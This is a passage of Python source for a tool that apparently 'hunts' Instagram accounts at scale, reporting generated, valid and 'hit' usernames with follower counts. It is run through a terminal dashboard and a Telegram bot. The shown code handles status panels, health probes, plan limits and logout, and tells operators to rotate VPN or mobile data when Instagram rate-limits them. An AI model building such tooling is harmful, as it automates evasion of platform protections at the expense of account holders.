        followers = info.get("follower_count", "—")
        lines.append(
            f"  {S['bullet']} <code>#{idx}</code>  "
            f"<b>@{html.escape(str(username))}</b>  ·  {name}\n"
            f"      followers <code>{html.escape(str(followers))}</code>\n"
        )
    if errors:
        lines.append(f"\n<i>{errors} failed · max {GEN_CMD_MAX_COUNT} per /gen</i>\n")
    return "".join(lines)


def _clear_local_telegram_link_files():
    clear_local_bot_token()
    try:
        if os.path.isfile(_device_chat_file()):
            os.remove(_device_chat_file())
    except OSError:
        pass


def finish_operator_logout_session():
    """Stop bot poll and wipe local session — restart shows Telegram setup."""
    clear_telegram_session()
    clear_all_local_operator_state(mark_logged_out=True)
    invalidate_operator_gate_cache()
    license_invalidate_cache()
    apply_worker_pause_state()
    log_event("LOGOUT", "Local session cleared — link bot again on restart")


def terminal_print_logout_confirm_box():
    print()
    for line in paint_action_box(
        "LOG OUT",
        [
            ("Clears bot link + local session on this device.", ANSI_YELLOW),
            ("Hit group stays on your Telegram ID in cloud (if linked).", ANSI_DIM),
            ("Type y to confirm, anything else to cancel.", ANSI_DIM),
        ],
        ANSI_YELLOW,
    ):
        print(line)
    print()


def terminal_execute_logout(*, confirm=True):
    """Terminal logout — wipe local .inpareto_* session (Telegram-ID keyed)."""
    global _telegram_monitor_started
    linked = TELEGRAM_ENABLED or has_local_operator_session() or _read_stored_chat_id()
    if not linked:
        print(apply_color("\n  Nothing to log out — no Telegram session on this device.\n", ANSI_DIM))
        return False
    if confirm:
        terminal_print_logout_confirm_box()
        ans = premium_input("Confirm logout", "y=yes  Enter=cancel").lower()
        if ans not in ("y", "yes"):
            print(apply_color("  Logout cancelled.\n", ANSI_DIM))
            return False
    saved_hg = preserve_operator_hit_group_for_user()
    finish_operator_logout_session()
    _telegram_monitor_started = False
    rows = [("Local session cleared — link bot again on next start.", ANSI_GREEN)]
    if saved_hg:
        rows.append((f"Hit group saved on Telegram ID · {saved_hg}", ANSI_GREEN))
    print()
    for line in paint_action_box("LOGGED OUT", rows, ANSI_GREEN):
        print(line)
    print()
    return True


TERMINAL_MENU_HINT = "1=panel  2=status  l=logout  q=quit"
TERMINAL_WAIT_HINT = "Enter=refresh  l=logout  q=quit"


def cmd_logout_operator():
    """Telegram logout confirm: clears local session only (device hash removed)."""
    support = resolve_support_contact_html()
    return True, format_action_notice(
        "Logged out",
        "Telegram unlinked on this device.\n\n"
        f"<b>Data cleared on this device.</b> To restore access, contact support: {support}\n\n"
        f"<b>Next step:</b> stop the script (menu {tg_code('q')}) and run "
        f"{tg_code('python joint.py')} again — use cloud restore with your Telegram ID "
        f"or link your bot when asked.",
        "OK",
        detail_html=True,
    )


def _run_api_probe():
    global _api_probe_fail_streak
    ok = False
    base = None
    via = None
    for host in api_target_hosts():
        try:
            response = _api_probe_session.get(
                f"http://{host}/alive",
                timeout=API_PROBE_TIMEOUT,
            )
            if response.ok and response.json().get("alive") is True:
                ok = True
                base = f"http://{host}"
                if host.startswith("127.") or host.startswith("localhost"):
                    via = "local"
                else:
                    via = "public"
                break
        except Exception:
            continue
    if ok:
        _api_probe_fail_streak = 0
    elif _hunt_recently_ok() or _hunt_in_network_blip():
        return
    else:
        _api_probe_fail_streak += 1
    with _health_lock:
        _health_cache["api"] = ok
        _health_cache["api_base"] = base
        _health_cache["api_via"] = via
        _health_cache["api_at"] = time.time()


def _run_cloud_probe():
    if not is_cloud_enabled():
        with _health_lock:
            _health_cache["cloud"] = False
            _health_cache["cloud_at"] = time.time()
        return
    ok = False
    try:
        response = requests.get(
            f"{SUPABASE_URL}/rest/v1/app_settings",
            headers=supabase_headers(),
            params={"select": "key", "limit": "1"},
            timeout=CLOUD_PROBE_TIMEOUT,
        )
        ok = response.ok
    except Exception:
        ok = False
    with _health_lock:
        _health_cache["cloud"] = ok
        _health_cache["cloud_at"] = time.time()


def _health_monitor_loop():
    while True:
        _run_api_probe()
        sync_api_auto_pause()
        _run_cloud_probe()
        with _health_lock:
            api_ok = _health_cache["api"]
            cloud_ok = _health_cache["cloud"]
        if _api_auto_paused or not api_ok or _hunt_recently_ok():
            delay = PROBE_INTERVAL_FAIL
        else:
            delay = PROBE_INTERVAL_OK if cloud_ok else PROBE_INTERVAL_FAIL
        time.sleep(delay)


def start_health_monitor():
    threading.Thread(target=_health_monitor_loop, daemon=True).start()


def get_api_alive_cached():
    """Read cached API state only — never blocks on /alive (live panel safe)."""
    if _hunt_recently_ok():
        return True
    with _health_lock:
        cached = _health_cache["api"]
    if cached is None:
        return False
    return bool(cached)


def get_api_alive():
    if _hunt_recently_ok():
        return True
    with _health_lock:
        cached = _health_cache["api"]
        age = time.time() - _health_cache.get("api_at", 0)
    stale = 3 if _IS_TERMUX else 6
    if cached is None or (not cached and age > stale):
        refresh_api_probe(force=True)
    with _health_lock:
        return bool(_health_cache["api"])


def get_cloud_alive():
    with _health_lock:
        if _health_cache["cloud"] is None:
            return False
        return bool(_health_cache["cloud"])


def probe_api_alive():
    return get_api_alive()


def probe_cloud_alive():
    return get_cloud_alive()


def cloud_power_label():
    if not is_cloud_enabled():
        return "◌ OFF  no creds", ANSI_RED
    with _health_lock:
        cloud_state = _health_cache["cloud"]
    if cloud_state is None:
        return "◌ …  checking", ANSI_DIM
    if get_cloud_alive():
        return "● ON  reachable", ANSI_GREEN
    return "◌ OFF  unreachable", ANSI_RED


def api_power_label():
    with _health_lock:
        api_state = _health_cache["api"]
    if api_state is None:
        return "◌ …  checking", ANSI_DIM
    api_check = get_api_alive_cached if JACK_PANEL_LIVE else get_api_alive
    if not api_check():
        return "◌ OFF  dead", ANSI_RED
    via = _health_cache.get("api_via")
    if via == "local":
        return f"● ON  local :{port}", ANSI_GREEN
    if via == "public":
        return f"● ON  public {ip}", ANSI_GREEN
    return "● ON  alive", ANSI_GREEN


def cloud_sync_label():
    if not is_cloud_enabled():
        return "◌ OFF", ANSI_DIM
    with _health_lock:
        cloud_state = _health_cache["cloud"]
    if cloud_state is None:
        return "◌ …  checking", ANSI_DIM
    if not get_cloud_alive():
        return "◌ OFF  cloud down", ANSI_RED
    if is_device_ready():
        return "● ON  synced", ANSI_GREEN
    return "● ON  partial", ANSI_YELLOW


def _dashboard_free_plan_snap(user_id):
    row = plan_fetch_free_row(user_id, registry=None, online=False)
    day_count, _today = plan_free_day_count(row)
    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
    now = datetime.now(timezone.utc)
    return {
        "plan": PLAN_FREE,
        "tier": PLAN_FREE,
        "day_count": day_count,
        "limit": FREE_DAILY_GEN_LIMIT,
        "trial_expired": plan_free_trial_expired(row),
    }


def _dashboard_local_premium_snap(user_id):
    """Fast premium check from local license file only."""
    local = read_local_license()
    if not local or str(local.get("user_id")) != user_id:
        return None
    exp = license_parse_iso(local.get("expires_at"))
    if exp is None or exp > datetime.now(timezone.utc):
        return {"tier": PLAN_PREMIUM, "plan": PLAN_PREMIUM, "active": True}
    return None


def _dashboard_plan_snapshot(user_id):
    """Plan row for panel — live mode avoids cloud locks; sticky premium prevents flash."""
    user_id = str(user_id or "").strip()
    if not user_id:
        return {}
    now = time.time()
    cached = _dashboard_plan_cache
    if (
        cached.get("uid") == user_id
        and cached.get("snap")
        and now - float(cached.get("at") or 0) < DASHBOARD_PLAN_CACHE_TTL
    ):
        return dict(cached["snap"])
    if admin_is_admin(user_id):
        snap = {"tier": "admin", "plan": PLAN_PREMIUM}
    elif not JACK_PANEL_LIVE:
        try:
            snap = plan_build_snapshot(user_id)
        except Exception:
            snap = _dashboard_local_premium_snap(user_id) or _dashboard_free_plan_snap(user_id)
    else:
        premium = _dashboard_local_premium_snap(user_id)
        if premium:
            snap = premium
        elif (
            cached.get("uid") == user_id
            and (cached.get("snap") or {}).get("plan") == PLAN_PREMIUM
            and now - float(cached.get("at") or 0) < DASHBOARD_PLAN_STICKY_PREMIUM_SEC
        ):
            snap = dict(cached["snap"])
        else:
            snap = _dashboard_free_plan_snap(user_id)
    _dashboard_plan_cache.update(uid=user_id, snap=snap, at=now)
    return dict(snap)


def build_session_rows(uptime, status_text, status_color):
    cloud_text, cloud_color = cloud_power_label()
    api_text, api_color = api_power_label()
    sync_text, sync_color = cloud_sync_label()
    uid = resolve_operator_telegram_id()
    plan_info = _dashboard_plan_snapshot(uid) if uid else {}
    if plan_info.get("tier") == "admin":
        plan_text, plan_color = "Admin", ANSI_MAGENTA
    elif plan_info.get("plan") == PLAN_PREMIUM:
        plan_text, plan_color = "Premium", ANSI_GREEN
    elif plan_info.get("plan") == PLAN_FREE:
        used = int(plan_info.get("day_count") or 0)
        limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
        if plan_info.get("trial_expired"):
            plan_text, plan_color = "Free · expired", ANSI_RED
        elif used >= limit:
            plan_text, plan_color = f"Free · {used:,}/{limit:,}", ANSI_RED
        else:
            plan_text, plan_color = f"Free · {used:,}/{limit:,}", ANSI_YELLOW
    else:
        plan_text, plan_color = "—", ANSI_DIM
    rows = [
        ("Status", f"{'●' if not paused else '◌'} {status_text}", status_color),
        ("Plan", plan_text, plan_color),
        ("Uptime", uptime, ANSI_CYAN),
        ("Cloud", cloud_text, cloud_color),
        ("API", api_text, api_color),
        ("Sync", sync_text, sync_color),
    ]
    base = get_api_base_url()
    api_alive = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
    rows.append(("Active", base.replace("http://", ""), ANSI_GREEN if api_alive else ANSI_YELLOW))
    if ip != "127.0.0.1":
        rows.append(("Registered", f"{ip}:{port}", ANSI_CYAN))
    rows.extend([
        ("Threads", str(THREAD_COUNT), ANSI_BLUE),
        ("Timeout", f"{TIMEOUT}s", ANSI_BLUE),
        ("Telegram", "enabled" if TELEGRAM_ENABLED else "disabled",
         ANSI_GREEN if TELEGRAM_ENABLED else ANSI_DIM),
    ])
    if DEVICE_HASH:
        rows.append(("Device", f"{DEVICE_HASH[:16]}…", ANSI_CYAN))
    if is_device_ready():
        rows.append(("Operator", resolve_operator_id(TELEGRAM_CHAT_ID)[:34], ANSI_MAGENTA))
    return rows


def build_core_rows(generated, valid_count, hits_count, error_count, bar_w=14):
    rows = [
        ("Generated", f"{generated:>6}  {make_colored_bar(generated, max(generated, 1000), bar_w, ANSI_GREEN)}", None),
        ("Valid", f"{valid_count:>6}  {make_colored_bar(valid_count, max(valid_count, 100), bar_w, ANSI_CYAN)}", None),
        ("Hits", f"{hits_count:>6}  {make_colored_bar(hits_count, max(hits_count, 50), bar_w, ANSI_GREEN)}", None),
    ]
    if error_count > 0:
        rows.append(("Errors", f"{error_count:>6}  {make_colored_bar(error_count, max(error_count, 100), bar_w, ANSI_RED)}", None))
    else:
        rows.append(("Health", f"{'CLEAN':>6}  {apply_color('▰' * bar_w, ANSI_GREEN)}", None))
    return rows


def _hunt_pace_label(*, generated=None) -> tuple[str, str]:
    generated = int(generated if generated is not None else gen)
    elapsed = max(0.1, (datetime.now(timezone.utc) - START_TIME).total_seconds())
    session_rate = generated / elapsed * 60.0
    idle = max(0.0, time.monotonic() - _last_gen_at)
    pulse_elapsed = max(0.1, time.monotonic() - _pulse_last_at)
    pulse_delta = max(0, generated - _pulse_last_gen)
    recent_rate = pulse_delta / pulse_elapsed * 60.0
    rate_show = recent_rate if pulse_delta > 0 else session_rate
    if idle > 30:
        color = ANSI_RED
        text = f"{rate_show:>4.0f}/min · idle {idle:.0f}s"
    elif idle > 12:
        color = ANSI_YELLOW
        text = f"{rate_show:>4.0f}/min · idle {idle:.0f}s"
    else:
        color = ANSI_GREEN
        text = f"{rate_show:>4.0f}/min"
    return text, color


def build_performance_rows(success_pct, hit_pct, valid_pct, bar_w=14, *, generated=None):
    hit_color = ANSI_GREEN if hit_pct > 50 else ANSI_YELLOW
    pace_text, pace_color = _hunt_pace_label(generated=generated)
    return [
        ("Pace", pace_text, pace_color),
        ("Success", f"{success_pct:>5.1f}% {make_colored_bar(success_pct, 100, bar_w, ANSI_CYAN)}", None),
        ("Hit rate", f"{hit_pct:>5.1f}% {make_colored_bar(hit_pct, 100, bar_w, hit_color)}", None),
        ("Valid/Hits", f"{valid_pct:>5.1f}% {make_colored_bar(valid_pct, 100, bar_w, ANSI_CYAN)}", None),
    ]


def dashboard_card_inner_width():
    """Use full terminal width — same span as the two cards above + footer."""
    try:
        cols = os.get_terminal_size().columns
    except OSError:
        cols = 80
    # Align with ACTION_BOX_W / side-by-side row (~68–73 chars content)
    return max(min(cols - 4, ACTION_BOX_W - 4), 68)


def clip_event_log_line(event, max_len):
    text = str(event)
    if len(text) <= max_len:
        return text
    return text[: max(max_len - 1, 8)] + "…"


def build_event_rows(events, value_w=None):
    if value_w is None:
        value_w = dashboard_card_inner_width() - 14
    rows = []
    for event in _operator_visible_events(events)[-4:]:
        color = ANSI_RED if "ERROR" in event else (
            ANSI_GREEN if "HIT" in event and "] ADMIN" not in event.upper() else ANSI_YELLOW
        )
        label = "Event" if not rows else f"Log {len(rows) + 1}"
        rows.append((label, clip_event_log_line(event, value_w), color))
    return rows


def _event_log_card_lines(events):
    inner = dashboard_card_inner_width()
    label_w = 11
    value_w = max(inner - label_w - 3, 40)
    lines = list(paint_info_card(build_event_rows(events, value_w), label_w, value_w))
    lines.append("")
    return lines


def print_event_log_card(events):
    for line in _event_log_card_lines(events):
        print(line)


def _hunt_buffer_depth():
    buf = _hunt_gateway_meta.get("buffer")
    try:
        return int(buf) if buf is not None else None
    except (TypeError, ValueError):
        return None


def _hunt_buffer_healthy():
    depth = _hunt_buffer_depth()
    return depth is not None and depth >= HUNT_KEEPALIVE_BUFFER_MIN


def _hunt_gen_recently_active(idle_sec=None):
    """True while hunt is actively generating — hit enrich must stay lightweight."""
    limit = idle_sec if idle_sec is not None else (120 if _IS_TERMUX else 90)
    return time.monotonic() - _last_gen_at < limit


def _hit_pipeline_light_only():
    """During hot hunt: caption edit only — no graphql/mobile/deep work."""
    return _workers_started and _hunt_gen_recently_active()


def _hunt_active_session():
    """Hunt was running recently — avoid auto-pausing on probe blips."""
    if not _workers_started or is_locally_logged_out() or _user_manual_paused:
        return False
    if _hunt_recently_ok():
        return True
    if _hunt_buffer_healthy():
        return True
    idle = time.monotonic() - _last_gen_at
    with lock:
        generated = int(gen)
    if generated > 0 and idle < HUNT_KEEPALIVE_IDLE_SEC:
        return True
    if JACK_PANEL_LIVE and pause_event.is_set() and idle < HUNT_KEEPALIVE_IDLE_SEC:
        return True
    return False


def _refresh_hunt_gateway_meta(force=False):
    global _hunt_gateway_meta
    now = time.time()
    if not force and now - float(_hunt_gateway_meta.get("updated") or 0) < 4.0:
        return
    data, _ = api_fetch_json(
        "/alive",
        timeout=(HUNT_CONNECT_TIMEOUT, 4),
    )
    if not isinstance(data, dict):
        return
    depth_map = (data.get("speed") or {}).get("buffer_depth") or {}
    depth = 0
    if isinstance(depth_map, dict) and depth_map:
        try:
            depth = max(int(v or 0) for v in depth_map.values())
        except (TypeError, ValueError):
            depth = 0
    _hunt_gateway_meta = {
        "buffer": depth,
        "ig_block": float(data.get("ig_block_sec") or 0.0),
        "updated": now,
    }


def _operator_hunt_trusted():
    """Verified session — don't stall hunt on transient ACCESS_BLOCKED during live panel."""
    if not TELEGRAM_ENABLED:
        return True
    uid = resolve_operator_telegram_id()
    if not uid:
        return False
    if admin_is_admin(uid):
        return True
    return bool(
        read_operator_session_verified(uid)
        or operator_access_sticky_active()
        or _access_trust_grace_active()
    )


def _hunt_health_snapshot(*, live=False):
    """Unified hunt state for panel header, probe row, and block reason."""
    idle = time.monotonic() - _last_gen_at
    meta = _hunt_gateway_meta
    buf = meta.get("buffer")
    ig_block = float(meta.get("ig_block") or 0.0)
    workers = len(worker_threads) or THREAD_COUNT
    api_ok = get_api_alive_cached() if live else get_api_alive()
    block = None
    hunt_lbl = f"active · {workers}w"
    hunt_color = ANSI_GREEN
    status_text = "RUNNING"
    status_color = ANSI_GREEN

    if not _workers_started:
        block = "workers not started"
        hunt_lbl, hunt_color = "standby", ANSI_YELLOW
        status_text, status_color = "STANDBY", ANSI_YELLOW
    elif is_locally_logged_out():
        block = "logged out"
        hunt_lbl, hunt_color = "logged out", ANSI_RED
        status_text, status_color = "LOGGED OUT", ANSI_RED
    elif TELEGRAM_ENABLED and (uid := resolve_operator_telegram_id()) and operator_ban_active(uid, force=False):
        block = "suspended — contact admin"
        hunt_lbl, hunt_color = "suspended", ANSI_RED
        status_text, status_color = "SUSPENDED", ANSI_RED
    elif _api_auto_paused:
        block = "API offline — run endpoint.py"
        hunt_lbl, hunt_color = "API offline", ANSI_RED
        status_text, status_color = "API OFF", ANSI_RED
    elif _user_manual_paused:
        block = "paused (manual)"
        hunt_lbl, hunt_color = "standby (paused)", ANSI_YELLOW
        status_text, status_color = "PAUSED", ANSI_YELLOW
    elif _hunt_in_ip_change_pause():
        left = _hunt_ip_change_pause_left()
        mins = int(left // 60)
        secs = int(left % 60)
        block = f"Instagram rate limited — change IP ({mins}m{secs:02d}s)"
        hunt_lbl = f"CHANGE IP · {mins}m{secs:02d}s"
        hunt_color = ANSI_RED
        status_text, status_color = "CHANGE IP", ANSI_RED
    elif not api_ok and not _hunt_recently_ok():
        if _local_gateway_mode() and pause_event.is_set():
            block = None
        else:
            block = "API unreachable"
            hunt_lbl, hunt_color = "API down", ANSI_RED
            status_text, status_color = "API DOWN", ANSI_RED
    elif TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
        block = "access gate — finish Telegram setup"
        hunt_lbl, hunt_color = "access gate", ANSI_YELLOW
        status_text, status_color = "ACCESS GATE", ANSI_YELLOW
    elif not pause_event.is_set():
        block = "workers on standby — /resume or open Live Panel"
        hunt_lbl, hunt_color = "standby", ANSI_YELLOW
        status_text, status_color = "STANDBY", ANSI_YELLOW
    elif idle > 8 and (api_ok or _hunt_recently_ok() or _hunt_active_session()):
        # Live panel: keep RUNNING — transient hunt states only in probe row, not status card.
        soft_hunt = live and pause_event.is_set() and _workers_started
        if ig_block > 1.0:
            hunt_lbl = f"IG cooldown {ig_block:.0f}s"
            hunt_color = ANSI_RED
            if not soft_hunt:
                block = f"IG cooldown {ig_block:.0f}s"
                status_text, status_color = f"IG COOLDOWN {ig_block:.0f}s", ANSI_RED
        elif buf is not None and buf >= 1600 and idle > 25 and not pause_event.is_set():
            hunt_lbl = f"paused · buf {buf} full"
            hunt_color = ANSI_YELLOW
            if not soft_hunt:
                status_text, status_color = "PAUSED", ANSI_YELLOW
        elif buf is not None and buf >= 1600 and idle > 25:
            hunt_lbl = f"backlog · {workers}w · buf {buf}"
            hunt_color = ANSI_YELLOW if idle < 60 else ANSI_RED
            if not soft_hunt and idle > 90:
                block = f"endpoint backlog · buf {buf} — not an IP issue"
        elif buf is not None and buf > 400 and idle > 60:
            hunt_lbl = f"slow drain · buf {buf}"
            hunt_color = ANSI_YELLOW
        elif (
            _IS_TERMUX
            and buf is not None
            and buf >= TERMUX_BUFFER_NEAR_FULL
            and idle < 25
            and not block
        ):
            hunt_lbl = f"lookup bound · buf {buf}"
            hunt_color = ANSI_YELLOW
        elif buf is not None and buf < 8:
            hunt_lbl = "buffer empty"
            hunt_color = ANSI_YELLOW
            if not soft_hunt:
                block = "IG buffer empty"
                status_text, status_color = "BUF EMPTY", ANSI_YELLOW
        elif idle > 22:
            hunt_lbl = f"idle {idle:.0f}s"
            hunt_color = ANSI_RED
            if not soft_hunt:
                block = f"gen idle {idle:.0f}s"
                status_text, status_color = f"GEN IDLE {idle:.0f}s", ANSI_RED
        elif buf is not None:
            hunt_lbl = f"active · {workers}w · buf {buf}"
    with _hunt_inflight_lock:
        inflight = int(_hunt_inflight)
    if (
        inflight >= max(8, HUNT_GATEWAY_CONCURRENCY // 2)
        and not block
        and pause_event.is_set()
    ):
        hunt_lbl = f"busy · {inflight}/{HUNT_GATEWAY_CONCURRENCY} slots"
        hunt_color = ANSI_CYAN

    return {
        "block": block,
        "hunt_lbl": hunt_lbl[:28],
        "hunt_color": hunt_color,
        "status_text": status_text[:22],
        "status_color": status_color,
        "idle": idle,
        "buf": buf,
    }


def _hunt_block_reason_live():
    """Fast hunt status for live panel — no license/cloud probes on redraw."""
    return _hunt_health_snapshot(live=True).get("block")


def _paint_dashboard_footer_live():
    """Live footer — never swap to a blocking HUNT screen; hunt state stays in probe row."""
    if _hunt_in_ip_change_pause():
        left = _hunt_ip_change_pause_left()
        mins = int(left // 60)
        secs = int(left % 60)
        return paint_action_box(
            "CHANGE IP",
            [
                (
                    f"Instagram rate limited {HUNT_IG_RATE_LIMIT_STREAK_TRIGGER}× — hunt paused.",
                    ANSI_RED,
                ),
                (
                    f"Rotate VPN / mobile data · auto-resume in {mins}m{secs:02d}s",
                    ANSI_YELLOW,
                ),
            ],
            ANSI_RED,
        )
    if TELEGRAM_ENABLED and ACCESS_BLOCKED and _operator_hunt_trusted():
        return paint_action_box(
            "TELEGRAM",
            [
                ("Cloud/TG blip — hunt continues on verified session.", ANSI_YELLOW),
                ("Bot replies retry automatically when network returns.", ANSI_DIM),
            ],
            ANSI_CYAN,
        )
    if TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
        return paint_action_box(
            "ACCESS PENDING",
            [("Complete setup in Telegram bot.", ANSI_YELLOW)],
            ANSI_YELLOW,
        )
    if not get_api_alive_cached() and not _hunt_recently_ok():
        return paint_action_box(
            "API OFFLINE",
            [
                ("Gateway not responding — start endpoint.py on this machine.", ANSI_RED),
                (f"Tried: {', '.join(api_target_hosts())}", ANSI_YELLOW),
            ],
            ANSI_RED,
        )
    return paint_action_box(
        "TELEGRAM",
        [
            ("Remote control active — send /help in your linked chat.", ANSI_GREEN),
            ("Terminal: Ctrl+C → menu · l=logout", ANSI_DIM),
        ],
        ANSI_CYAN,
    )


def build_probe_rows():
    api_ok = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
    cloud_ok = get_cloud_alive()
    via = _health_cache.get("api_via") or "none"
    if JACK_PANEL_LIVE:
        snap = _hunt_health_snapshot(live=True)
        hunt_lbl = snap["hunt_lbl"]
        hunt_color = snap["hunt_color"]
    else:
        block = hunt_block_reason()
        if block:
            hunt_lbl = block[:28]
            hunt_color = ANSI_YELLOW if "cooldown" not in block.lower() else ANSI_RED
        elif paused:
            hunt_lbl = "standby (paused)"
            hunt_color = ANSI_YELLOW
        else:
            n = len(worker_threads) or THREAD_COUNT
            meta = _hunt_gateway_meta
            buf = meta.get("buffer")
            buf_tag = f" · buf {buf}" if buf is not None else ""
            hunt_lbl = f"active · {n}w{buf_tag}"
            hunt_color = ANSI_GREEN
    if api_ok:
        api_lbl = f"live via {via}"
    elif _local_gateway_mode() and pause_event.is_set():
        api_lbl = "live · local hunt"
    else:
        api_lbl = f"down via {via}"
    ig_block = float(_hunt_gateway_meta.get("ig_block") or 0.0)
    if _hunt_in_ip_change_pause():
        left = _hunt_ip_change_pause_left()
        hunt_lbl = f"CHANGE IP · {int(left // 60)}m{int(left % 60):02d}s"
        hunt_color = ANSI_RED
    elif api_ok and ig_block > 1.0:
        api_lbl = f"live · IG {ig_block:.0f}s"
    return [
        ("Hunt", hunt_lbl, hunt_color),
        ("API probe", api_lbl, ANSI_GREEN if api_ok else ANSI_RED),
        ("Cloud probe", "live" if cloud_ok else "down",
         ANSI_GREEN if cloud_ok else ANSI_RED),
    ]


def paint_dashboard_footer():
    if TELEGRAM_ENABLED and ACCESS_BLOCKED:
        rows = build_terminal_access_notice_rows()
        if rows:
            return paint_action_box(_terminal_notice_title(rows), rows, ANSI_YELLOW)
        return paint_action_box(
            "ACCESS PENDING",
            [("Complete setup in Telegram bot.", ANSI_YELLOW)],
            ANSI_YELLOW,
        )
    api_alive = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
    if not api_alive:
        return paint_action_box(
            "API OFFLINE",
            [
                ("Gateway not responding — start endpoint.py on this machine.", ANSI_RED),
                (f"Tried: {', '.join(api_target_hosts())}", ANSI_YELLOW),
            ],
            ANSI_RED,
        )
    block = hunt_block_reason()
    if block and block != "workers not started":
        return paint_action_box(
            "HUNT BLOCKED",
            [(block, ANSI_YELLOW)],
            ANSI_YELLOW,
        )
    if TELEGRAM_ENABLED and operator_access_ok():
        return paint_action_box(
            "TELEGRAM",
            [
                ("Remote control active — send /help in your linked chat.", ANSI_GREEN),
                ("Terminal: l = log out this device", ANSI_DIM),
            ],
            ANSI_CYAN,
        )
    if ip == "127.0.0.1":
        return paint_action_box(
            "SETUP",
            [("Run endpoint.py first to register the cloud API host.", ANSI_YELLOW)],
            ANSI_YELLOW,
        )
    return paint_action_box(
        "SESSION",
        [("Live operations running — Ctrl+C stops this session.", ANSI_GREEN)],
        ANSI_CYAN,
    )


def premium_input(label, hint=""):
    print(apply_color(f"  ▸ {label}", ANSI_CYAN))
    if hint:
        print(apply_color(f"    {hint}", ANSI_DIM))
    try:
        return input(apply_color("    › ", ANSI_YELLOW)).strip()
    except EOFError:
        return ""


def _defer_linked_device_sync(record):
    """Background cloud/Telegram sync so boot + bot poll are not blocked."""
    if is_locally_logged_out() or not has_local_operator_session():
        return
    try:
        if is_locally_logged_out() or not TELEGRAM_ENABLED:
            return
        chat_id = str((record or {}).get("telegram_chat_id") or TELEGRAM_CHAT_ID or "").strip()
        if chat_id:
            restore_operator_hit_group_for_user(chat_id)
        reconcile_operator_hit_group()
        label = (record or {}).get("display_name")
        chat_id = str((record or {}).get("telegram_chat_id") or TELEGRAM_CHAT_ID or "").strip()
        bot_token = str((record or {}).get("telegram_bot_token") or TELEGRAM_BOT_TOKEN or "").strip()
        if not bot_token or not chat_id:
            return
        if is_locally_logged_out():
            return
        if TELEGRAM_CHAT_ID:
            info = fetch_telegram_user(chat_id)
            label = (info or {}).get("display_name") or label
        if is_locally_logged_out():
            return
        sync_operator_name_from_telegram(chat_id)
        if is_locally_logged_out():
            return
        admin_load_settings(force=True)
        sync_operator_access()
        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
        if operator_access_ok(force=True):
            mark_operator_access_verified()
    except Exception as exc:
        log_event("BOOT SYNC", str(exc)[:100])


def _warmup_probes_once():
    _run_api_probe()
    sync_api_auto_pause()
    _run_cloud_probe()


def render_boot_screen(record, cloud_err, api_linked):
    print()
    for line in paint_logo_lines(JOINT_BADGE):
        print(line)
    print()

    cloud_text, cloud_color = cloud_power_label()
    if cloud_err:
        cloud_text, cloud_color = "● ON  lookup failed", ANSI_RED
    api_text, api_color = api_power_label()
    if not api_linked and ip == "127.0.0.1":
        api_text, api_color = "◌ OFF  run endpoint.py", ANSI_YELLOW
    sync_text, sync_color = cloud_sync_label()
    tg_linked = bool(record and record.get("telegram_bot_token") and record.get("telegram_chat_id"))

    tg_id = str((record or {}).get("telegram_chat_id") or _read_stored_chat_id() or "").strip()
    rows = [
        ("Telegram ID", tg_id or "—", ANSI_CYAN),
        ("Host", (platform.node() or "local")[:34], ANSI_BLUE),
        ("Cloud", cloud_text, cloud_color),
        ("API", api_text, api_color),
        ("Sync", sync_text, sync_color),
        ("Telegram", "linked" if tg_linked else "not linked", ANSI_GREEN if tg_linked else ANSI_YELLOW),
    ]
    if tg_linked:
        rows.append(("Operator", str(record.get("display_name") or "linked")[:34], ANSI_MAGENTA))

    print_cards([rows])


def configure_telegram():
    global DEVICE_HASH, _boot_configuring
    _boot_configuring = True
    try:
        return _configure_telegram_impl()
    finally:
        _boot_configuring = False


def _configure_telegram_impl():
    reconcile_local_session_at_boot()
    if not is_cloud_enabled():
        print()
        for line in paint_action_box(
            "CONFIG",
            [("Set SUPABASE_URL and SUPABASE_ANON_KEY at top of joint.py.", ANSI_RED)],
            ANSI_RED,
        ):
            print(line)
        print()
        return
    record, err = None, None

    if is_locally_logged_out():
        render_boot_screen(None, None, apply_api_host_from_record(None))
        for line in paint_action_box(
            "LOGGED OUT",
            [
                ("Previous session ended. Link below or restore from cloud with your Telegram ID.", ANSI_YELLOW),
                ("Local files cleared; cloud still has your bot token if you linked before.", ANSI_DIM),
            ],
            ANSI_YELLOW,
        ):
            print(line)
        print()
    elif has_local_operator_session():
        record = _load_local_session_record()
        render_boot_screen(record, None, apply_api_host_from_record(None))
        if _boot_linked_from_local():
            return
        for line in paint_action_box(
            "SESSION",
            [
                (".inpareto files found but could not load — trying cloud backup.", ANSI_YELLOW),
                (f"State folder: {_device_state_dir()}", ANSI_DIM),
            ],
            ANSI_YELLOW,
        ):
            print(line)
        print()
        chat_id = _read_stored_chat_id()
        if chat_id and restore_operator_session_from_cloud(chat_id) and _boot_linked_from_local():
            return
    else:
        render_boot_screen(None, None, apply_api_host_from_record(None))
        for d in _state_dir_candidates():
            names = []
            try:
                names = [
                    n for n in os.listdir(d)
                    if n.startswith(".inpareto") and os.path.isfile(os.path.join(d, n))
                ]
            except OSError:
                continue
            if not names:
                continue
            for line in paint_action_box(
                "SESSION",
                [
                    (f"Found {len(names)} .inpareto file(s) in {d} but could not decrypt them.", ANSI_YELLOW),
                    ("Use cloud restore below (Telegram ID) or link bot again.", ANSI_DIM),
                ],
                ANSI_YELLOW,
            ):
                print(line)
            print()
            break

    if not is_locally_logged_out() and is_cloud_enabled():
        restore_id = premium_input(
            "Restore previous Telegram link from cloud?",
            "Enter your numeric Telegram ID, or Enter to skip",
        ).strip()
        if restore_id.isdigit() and restore_operator_session_from_cloud(restore_id):
            record = _load_local_session_record()
            render_boot_screen(record, None, apply_api_host_from_record(None))
            if _boot_linked_from_local():
                return

    for line in paint_action_box(
        "TELEGRAM SETUP",
        [
            ("Link your bot — session saves in ~/.inpareto (and cloud backup).", ANSI_YELLOW),
            ("Press Enter to skip if you only want local operations.", ANSI_DIM),
        ],
        ANSI_MAGENTA,
    ):
        print(line)
    print()

    ans = premium_input("Link Telegram to this device?", "Type y to continue, anything else to skip")
